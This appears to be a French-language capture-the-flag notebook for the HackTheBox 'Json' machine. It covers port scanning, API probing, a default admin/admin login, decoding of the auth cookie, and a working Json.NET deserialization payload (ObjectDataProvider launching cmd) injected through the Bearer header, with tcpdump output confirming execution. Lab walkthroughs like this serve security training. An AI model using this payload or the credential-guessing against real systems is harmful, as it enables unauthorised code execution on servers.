\chapter{json}
\begin{itemize}
    \item {\bf technics}: 
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Recon}
\subsection{nmap}
\begin{verbatim}
$ nmapz 10.10.10.158
ports found: 21,80,135,139,445,5985,47001,49152,49153,49154,49155,49156,49157,49158
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-29 04:29 CET
Nmap scan report for 10.10.10.158
Host is up (0.068s latency).

PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          FileZilla ftpd
| ftp-syst:
|_  SYST: UNIX emulated by FileZilla
80/tcp    open  http         Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Json HTB
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: JSON, NetBIOS user: <unknown>, NetBIOS MAC: 005056b9cb25 (VMware)
| smb2-security-mode:
|   302:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2023-01-29T03:31:00
|_  start_date: 2023-01-29T03:28:37
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

\end{verbatim}



\subsection{http}

html il y a une redirection qui se fait par JS 
\begin{verbatim}
$ curl -I http://10.10.10.158/index.html
HTTP/1.1 200 OK
Content-Length: 40163
Content-Type: text/html
Last-Modified: Thu, 23 May 2019 18:50:40 GMT
Accept-Ranges: bytes
ETag: "a836ea6a9811d51:0"
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Sun, 29 Jan 2023 03:46:32 GMT

\end{verbatim}
une redirection qui se fait par javascript visiblement donc avec
\verb+about:config+ on passe \verb+javascript.enabled+ à false et on voit la
page.

\begin{verbatim}
$ curl -s http://10.10.10.158/index.html |grep href |grep -v 'href="#"' | grep 'html'
<a class="sidebar-brand d-flex align-items-center justify-content-center" href="index.html">
    <a class="nav-link" href="index.html">
            <a class="collapse-item" href="buttons.html">Buttons</a>
            <a class="collapse-item" href="cards.html">Cards</a>
            <a class="collapse-item" href="utilities-color.html">Colors</a>
            <a class="collapse-item" href="utilities-border.html">Borders</a>
            <a class="collapse-item" href="utilities-animation.html">Animations</a>
            <a class="collapse-item" href="utilities-other.html">Other</a>
            <a class="collapse-item" href="login.html">Login</a>
            <a class="collapse-item" href="register.html">Register</a>
            <a class="collapse-item" href="forgot-password.html">Forgot Password</a>
            <a class="collapse-item" href="404.html">404 Page</a>
            <a class="collapse-item" href="blank.html">Blank Page</a>
    <a class="nav-link" href="charts.html">
    <a class="nav-link" href="tables.html">
                    <a class="btn btn-primary" href="login.html">Logout</a>

$ curl -s http://10.10.10.158/index.html 
    |grep href |grep -v 'href="#"' | grep "collapse" 
    | cut -d'"' -f4 > fuzz.txt
$ ffuf -u http://10.10.10.158/FUZZ  -w fuzz.txt

login.html              [Status: 200, Size: 4305, Words: 1705, Lines: 97, Duration: 28ms]

\end{verbatim}

sur la page de login

verbatim si on desobfucate (\href{https://deobfuscate.io/}) le fichier
\verb+js/app.min.js+:
\begin{verbatim}
angular.module("json", ["ngCookies"]).controller("loginController", ["$http", "$scope", "$cookies", function (_0x30f6x1, _0x30f6x2, _0x30f6x3) {
  _0x30f6x2.credentials = {UserName: "", Password: ""};
  _0x30f6x2.error = {message: "", show: false};
  var _0x30f6x4 = _0x30f6x3.get("OAuth2");
  if (_0x30f6x4) {
    window.location.href = "index.html";
  }
  ;
  _0x30f6x2.login = function () {
    _0x30f6x1.post("/api/token", _0x30f6x2.credentials).then(function (_0x30f6x5) {
      window.location.href = "index.html";
    }, function (_0x30f6x6) {
      _0x30f6x2.error.message = "Invalid Credentials.";
      _0x30f6x2.error.show = true;
      console.log(_0x30f6x6);
    });
  };
}]).controller("principalController", ["$http", "$scope", "$cookies", function (_0x30f6x1, _0x30f6x2, _0x30f6x3) {
  var _0x30f6x4 = _0x30f6x3.get("OAuth2");
  if (_0x30f6x4) {
    _0x30f6x1.get("/api/Account/", {headers: {Bearer: _0x30f6x4}}).then(function (_0x30f6x5) {
      _0x30f6x2.UserName = _0x30f6x5.data.Name;
    }, function (_0x30f6x6) {
      _0x30f6x3.remove("OAuth2");
      window.location.href = "login.html";
    });
  } else {
    window.location.href = "login.html";
  }
}]);
\end{verbatim}

y a un appel en POST ver \verb+api/token+ qui repond en 404.

\begin{verbatim}
$ curl -I -XPOST http://10.10.10.158/api/token
HTTP/1.1 411 Length Required
Content-Type: text/html; charset=us-ascii
Server: Microsoft-HTTPAPI/2.0
Date: Sun, 29 Jan 2023 04:12:16 GMT
Connection: close
Content-Length: 344
\end{verbatim}

\begin{verbatim}
$ curl -s -XPOST http://10.10.10.158/api/token -H 'Content-Type: application/json' -d '{"test"="test"}' |jq | sed -e 's/\\r\\n/\\\n/g'
{
  "Message": "An error has occurred.",
  "ExceptionMessage": "Object reference not set to an instance of an object.",
  "ExceptionType": "System.NullReferenceException",
  "StackTrace": "   at DemoAppExplanaiton.Controllers.AccountController.Login(Usuario login) in C:\\Users\\admin\\source\\repos\\DemoAppExplanaiton\\DemoAppExplanaiton\\Controllers\\AccountController.cs:line 24\
   at lambda_method(Closure , Object , Object[] )\
   at System.Web.Http.Controllers.ReflectedHttpActionDescriptor.ActionExecutor.<>c__DisplayClass6_2.<GetExecutor>b__2(Object instance, Object[] methodParameters)\
   at System.Web.Http.Controllers.ReflectedHttpActionDescriptor.ExecuteAsync(HttpControllerContext controllerContext, IDictionary`2 arguments, CancellationToken cancellationToken)\
--- End of stack trace from previous location where exception was thrown ---\
   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\
   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\
   at System.Web.Http.Controllers.ApiControllerActionInvoker.<InvokeActionAsyncCore>d__1.MoveNext()\
--- End of stack trace from previous location where exception was thrown ---\
   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\
   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\
   at System.Web.Http.Controllers.ActionFilterResult.<ExecuteAsync>d__5.MoveNext()\
--- End of stack trace from previous location where exception was thrown ---\
   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\
   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\
   at System.Web.Http.Dispatcher.HttpControllerDispatcher.<SendAsync>d__15.MoveNext()"
}
\end{verbatim}

a priori le token serait en cause ?

\begin{verbatim}
$ curl -i -XPOST http://10.10.10.158/api/token 
    -H 'Content-Type: application/json' 
    -d '{"UserName":"test", "Password":"test"}'
HTTP/1.1 404 Not Found
Cache-Control: no-cache
Pragma: no-cache
Content-Type: application/json; charset=utf-8
Expires: -1
Server: Microsoft-IIS/8.5
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Sun, 29 Jan 2023 04:43:08 GMT
Content-Length: 17

$ curl -i -XPOST http://10.10.10.158/api/token 
    -H 'Content-Type: application/json' 
    -d '{"UserName":"admin", "Password":"admin"}'
HTTP/1.1 202 Accepted
Cache-Control: no-cache
Pragma: no-cache
Expires: -1
Server: Microsoft-IIS/8.5
X-AspNet-Version: 4.0.30319
Set-Cookie: OAuth2=eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0=; expires=Sun, 29-Jan-2023 04:45:50 GMT; path=/
X-Powered-By: ASP.NET
Date: Sun, 29 Jan 2023 04:43:50 GMT
Content-Length: 0
\end{verbatim}


\begin{verbatim}
$ echo "eyJJZCI6MSwiVXNlci...SNIP...9yIn0=" |base64 -d |jq
{
  "Id": 1,
  "UserName": "admin",
  "Password": "21232f297a57a5a743894a0e4a801fc3",
  "Name": "User Admin HTB",
  "Rol": "Administrator"
}
\end{verbatim}

evidement quand on cherche \verb+asp.net json deserialization vulnerability+ on
tombe sur la ref à la box.

a priori on aurait de la command injection
\url{https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/DotNET.md#jsonnet}

\begin{verbatim}
{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd', '/c calc.exe']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
\end{verbatim}

ca ne marche pas en payload.


en fait en se logant en admin/admin on voit qu'il fait l'appel à l'api account
en lui passant le token dans bearer que l'on a recu par Set-Cookie

donc si on essaye de balancer le payload ladedans en base64

\begin{verbatim}
$ curl -i  http://10.10.10.158/api/Account \
    -H "Bearer: $(cat payload.txt |pencode b64encode)"
$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
06:21:58.935211 IP 10.10.10.158 > : ICMP echo request, id 1, seq 31, length 40
\end{verbatim}


\subsection{ftp}
\subsection{smb}

